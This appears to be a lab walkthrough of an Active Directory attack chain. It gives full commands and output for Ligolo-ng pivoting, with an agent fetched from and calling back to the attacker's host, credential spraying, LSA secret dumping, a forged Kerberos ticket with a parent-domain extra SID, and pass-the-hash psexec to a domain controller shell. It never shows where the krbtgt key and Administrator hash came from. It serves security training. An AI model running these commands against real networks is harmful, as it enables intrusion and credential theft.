# CWF Lab Walkthrough — Active Directory Pivoting & Domain Trust

## 1. Initial Access

The initial foothold was obtained on the external Ubuntu host:

```text
192.168.80.10
```

After obtaining SSH access, the host was identified as a potential pivot because it had connectivity to the internal network:

```text
192.168.98.0/24
```

The objective was to use the compromised Ubuntu machine to access systems that were not directly reachable from Kali.

---

## 2. Setting Up Ligolo-ng

The lab required Ligolo-ng for network pivoting. Initially, the agent and proxy versions were different, which caused a protocol compatibility issue.

The lab version of the agent was transferred to the Ubuntu pivot:

```bash
wget http://10.10.200.93:8000/agent
```

The agent was then started from the Ubuntu host:

```bash
./agent.1 -connect 10.10.200.93:443 -ignore-cert
```

The Ligolo proxy confirmed that the agent connected successfully:

```text
Agent joined.
name=privilege@ubuntu-virtual-machine
remote="192.168.80.10:45928"
```

A tunnel was then started through the connected session.

A route to the internal network was configured through the Ligolo interface:

```text
192.168.98.0/24 dev ligolo scope link
```

Connectivity to the internal network was verified with:

```bash
ping -c 3 192.168.98.15
```

---

## 3. Discovering Internal Hosts

The lab identified four relevant internal systems:

```text
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```

A TCP scan was performed through the pivot:

```bash
nmap -Pn -sT --top-ports 20 192.168.98.0/24
```

The results identified several interesting systems.

### 192.168.98.15

```text
22/tcp   open  ssh
80/tcp   open  http
```

### 192.168.98.30

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

### 192.168.98.120

```text
53/tcp   open  domain
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

### 192.168.98.2

```text
53/tcp   open  domain
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

The presence of DNS, RPC and SMB services suggested that `.2` and `.120` were domain controllers.

---

## 4. Credential Spraying

The discovered credentials were tested against the identified internal hosts using SMB.

The lab credentials were:

```text
Username: john
Password: User1@#$%6
```

The credentials were tested against the target list:

```bash
crackmapexec --verbose smb target.txt -u john -p 'User1@#$%6'
```

The results identified `john` as having administrative access to:

```text
192.168.98.30
```

---

## 5. Dumping LSA Secrets

Since `john` had administrative privileges on the management host, LSA secrets were extracted:

```bash
crackmapexec --verbose smb 192.168.98.30 \
-u john \
-p 'User1@#$%6' \
--lsa
```

Among the recovered credentials was the `corpmngr` account:

```text
corpmngr : User4&*&*
```

The newly discovered credentials were then tested against the internal systems:

```bash
crackmapexec --verbose smb target.txt \
-u corpmngr \
-p 'User4&*&*'
```

This identified administrative access to:

```text
192.168.98.120
```

---

## 6. Identifying the Domain Structure

The internal hosts were associated with two domains:

```text
192.168.98.2    warfare.corp
192.168.98.120  child.warfare.corp
```

The hosts file was configured accordingly:

```text
192.168.98.2   warfare.corp dc01.warfare.corp
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```

This revealed a parent/child Active Directory relationship:

```text
WARFARE.CORP
└── CHILD.WARFARE.CORP
```

---

## 7. Enumerating the Child Domain SID

Using the `corpmngr` credentials, the child domain SID was enumerated:

```bash
impacket-lookupsid \
'child/corpmngr:User4&*&*@child.warfare.corp'
```

The important result was:

```text
Domain SID is:
S-1-5-21-3754860944-83624914-1883974761
```

The enumeration also confirmed important accounts, including:

```text
CHILD\Administrator
CHILD\krbtgt
CHILD\john
CHILD\corpmngr
```

---

## 8. Enumerating the Parent Domain SID

The same technique was used against the parent domain:

```bash
impacket-lookupsid \
'child/corpmngr:User4&*&*@warfare.corp'
```

The parent domain SID was:

```text
S-1-5-21-3375883379-808943238-3239386119
```

The enumeration confirmed:

```text
WARFARE\Administrator
WARFARE\krbtgt
WARFARE\Domain Admins
WARFARE\Enterprise Admins
```

At this point, the two-domain trust relationship and the relevant SIDs were identified.

---

## 9. Forged Kerberos Ticket

The child-domain `krbtgt` key was used to create a forged Kerberos ticket for the child domain.

The ticket was generated with the child domain SID and the parent-domain SID included as an extra SID:

```bash
impacket-ticketer \
-domain child.warfare.corp \
-aesKey <CHILD_KRBTGT_AES_KEY> \
-domain-sid S-1-5-21-3754860944-83624914-1883974761 \
-groups 516 \
-user-id 1106 \
-extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 \
corpmngr
```

The ticket was successfully generated as:

```text
corpmngr.ccache
```

The Kerberos cache was then configured:

```bash
export KRB5CCNAME=./corpmngr.ccache
```

---

## 10. Requesting a Parent-Domain CIFS Service Ticket

Using the forged ticket, a service ticket was requested for the parent domain controller:

```bash
impacket-getST \
-spn 'CIFS/dc01.warfare.corp' \
-k \
-no-pass \
child.warfare.corp/corpmngr \
-debug
```

The important output confirmed that the cached TGT was successfully used:

```text
[+] Using Kerberos Cache: ./corpmngr.ccache
[+] Using TGT from cache
[*] Getting ST for user
[+] Trying to connect to KDC at CHILD.WARFARE.CORP:88
[+] Trying to connect to KDC at WARFARE.CORP:88
```

The resulting service ticket was saved as:

```text
corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

---

## 11. Compromising the Parent Domain Controller

Finally, the recovered parent-domain Administrator NTLM hash was used against:

```text
dc01.warfare.corp
```

The following command successfully established remote execution:

```bash
impacket-psexec -debug \
'warfare/Administrator@dc01.warfare.corp' \
-hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```

The output showed:

```text
[*] Found writable share ADMIN$
[*] Uploading file sELxbCSs.exe
[*] Opening SVCManager on dc01.warfare.corp.....
[*] Creating service lHwY on dc01.warfare.corp.....
[*] Starting service lHwY.....
```

An interactive Windows shell was obtained:

```text
Microsoft Windows [Version 10.0.17763.3650]

C:\Windows\system32>
```

The hostname was verified:

```cmd
hostname
```

Result:

```text
dc01
```

---

# Attack Path Summary

The complete attack chain was:

```text
External Ubuntu
192.168.80.10
       │
       │ SSH
       ▼
Compromised Pivot
       │
       │ Ligolo-ng
       ▼
Internal Network
192.168.98.0/24
       │
       ├── 192.168.98.30
       │       │
       │       └── john → LSA secrets
       │                    │
       │                    ▼
       │              corpmngr credentials
       │
       └── 192.168.98.120
               │
               └── Child Domain
                   child.warfare.corp
                         │
                         │ krbtgt key
                         ▼
                   Forged Kerberos Ticket
                         │
                         ▼
                   Parent Domain
                   warfare.corp
                         │
                         ▼
                   dc01.warfare.corp
                         │
                         ▼
                   Administrator
                         │
                         ▼
                   SYSTEM shell
```

## Final Result

The lab demonstrated a full Active Directory attack chain involving:

* Initial host compromise
* Network pivoting with Ligolo-ng
* Internal host discovery
* Credential spraying
* Local administrator compromise
* LSA credential extraction
* Child-domain enumeration
* Domain SID enumeration
* Kerberos ticket manipulation
* Parent-domain access
* NTLM pass-the-hash authentication
* Remote service execution
* Domain controller compromise

The final proof of compromise was an interactive shell on:

```text
dc01.warfare.corp
```

with the working directory:

```text
C:\Windows\system32
```
